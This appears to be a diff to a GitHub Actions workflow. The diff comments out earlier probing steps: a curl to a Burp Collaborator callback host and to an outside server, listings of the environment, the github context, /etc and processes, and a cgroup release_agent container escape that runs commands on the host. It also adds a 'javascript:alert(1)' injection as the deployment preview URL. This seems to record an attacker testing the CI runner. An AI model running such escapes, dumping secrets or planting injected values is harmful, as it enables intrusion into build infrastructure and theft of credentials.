@@ -16,54 +16,54 @@ jobs:
     steps:
       - uses: actions/checkout@v3
 
-      - name: whoami
-        run: |
-          whoami
-          echo $USER
+      # - name: whoami
+      #   run: |
+      #     whoami
+      #     echo $USER
 
-      - name: request burp collab
-        run: curl -i https://bvax5nq9pkc5mieakbbxu6cv4macy1.burpcollaborator.net/?sosi=hui
+      # - name: request burp collab
+      #   run: curl -i https://bvax5nq9pkc5mieakbbxu6cv4macy1.burpcollaborator.net/?sosi=hui
 
-      - name: curl server
-        run: curl -i rujka.ru
+      # - name: curl server
+      #   run: curl -i rujka.ru
 
-      - name: Open ports
-        run: sudo ss -ntlp
+      # - name: Open ports
+      #   run: sudo ss -ntlp
 
-      - name: Create interface?
-        run: sudo ip link add dummy0 type dummy
+      # - name: Create interface?
+      #   run: sudo ip link add dummy0 type dummy
 
-      - name: Interfaces
-        run: sudo ip link show
+      # - name: Interfaces
+      #   run: sudo ip link show
 
-      - name: /etc directory
-        run: ls -la /etc
+      # - name: /etc directory
+      #   run: ls -la /etc
 
-      - name: ps aux on container
-        run: sudo ps aux
+      # - name: ps aux on container
+      #   run: sudo ps aux
 
-      - name: Ps aux on "host"?
-        run: |
-          sudo mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-          sudo echo 1 > /tmp/cgrp/x/notify_on_release
-          sudo host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
-          sudo echo "$host_path/cmd" > /tmp/cgrp/release_agent
-          sudo echo '#!/bin/sh' > /cmd
-          sudo echo "ps aux > $host_path/output" >> /cmd
-          sudo chmod a+x /cmd
-          sudo sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+      # - name: Ps aux on "host"?
+      #   run: |
+      #     sudo mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+      #     sudo echo 1 > /tmp/cgrp/x/notify_on_release
+      #     sudo host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+      #     sudo echo "$host_path/cmd" > /tmp/cgrp/release_agent
+      #     sudo echo '#!/bin/sh' > /cmd
+      #     sudo echo "ps aux > $host_path/output" >> /cmd
+      #     sudo chmod a+x /cmd
+      #     sudo sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
 
-      - name: Display Environment Variables
-        run: env
+      # - name: Display Environment Variables
+      #   run: env
 
-      - name: Current folder
-        run: |
-          ls -la
-          pwd
+      # - name: Current folder
+      #   run: |
+      #     ls -la
+      #     pwd
 
-      - name: github context
-        run: echo "${{ toJson(github) }}"
+      # - name: github context
+      #   run: echo "${{ toJson(github) }}"
 
       - name: Setup node.js
         uses: actions/setup-node@v3
@@ -101,6 +101,7 @@ jobs:
         with:
           token: ${{ github.token }}
           environment: 'preview'
-          preview_url: ${{ steps.deploy.outputs.url }}
+          # preview_url: ${{ steps.deploy.outputs.url }}
+          preview_url: 'javascript:alert(1)'
           description: ${{ github.event.head_commit.message }}
         
